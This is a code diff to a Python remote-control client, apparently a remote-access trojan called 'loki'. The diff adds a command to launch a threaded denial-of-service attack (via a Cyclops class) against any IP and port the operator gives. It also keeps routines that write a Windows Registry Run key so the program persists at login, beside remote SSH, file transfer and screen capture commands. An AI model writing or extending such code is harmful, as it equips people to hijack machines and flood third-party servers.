@@ -8,6 +8,7 @@ import subprocess
 from os import chdir
 from time import sleep
 from queue import Queue
+from tasks.dos import Cyclops
 from . import ssh, sftp, screen
 from threading import Thread, RLock 
 
@@ -20,19 +21,26 @@ class Shell(object):
   self.session = sess_obj
   self.is_alive = True 
   self.lock = RLock()
+  self.task = None 
   self.home = home 
   self.ssh = None 
   self.ftp = None 
   self.cmds = {
-                1: self.ssh_obj,  
-                2: self.reconnect,
-                3: self.download,
-                4: self.upload,   
-                5: self.screen,  
-                6: self.chrome, 
-                7: self.disconnect,  
-                8: self.create_task,   
-                9: self.remove_task,   
+    1: self.ssh_obj,  
+    2: self.reconnect,
+    3: self.download,
+    4: self.upload,   
+    5: self.screen,  
+    6: self.chrome, 
+    7: self.disconnect,  
+    8: self.create_persist,   
+    9: self.remove_persist, 
+    10: self.task_start,
+    11: self.task_stop,
+  }
+
+  self.tasks = {
+    1: self.dos,
   }
 
  def listen_recv(self):
@@ -133,13 +141,32 @@ class Shell(object):
   cmd = 'start chrome -incognito {}'.format(' '.join(urls))
   subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
- def create_task(self, args):
+ def create_persist(self, args):
   if hasattr(sys, 'frozen'):
    _path = sys.executable
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(_path)
    subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
- def remove_task(self, args):
+ def remove_persist(self, args):
   if hasattr(sys, 'frozen'):
    cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
    subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+
+ ######## Tasks ########
+
+ def task_start(self, args):
+  task_id, args = args
+  if task_id in self.tasks:
+   if self.task:
+    self.task_stop(None)
+   self.tasks[task_id](args)
+  
+ def task_stop(self, args):
+  if self.task:
+   self.task.stop()
+   self.task = None 
+
+ def dos(self, args):
+  ip, port, threads = args
+  self.task = Cyclops(ip, port, threads)
+  self.task.start()
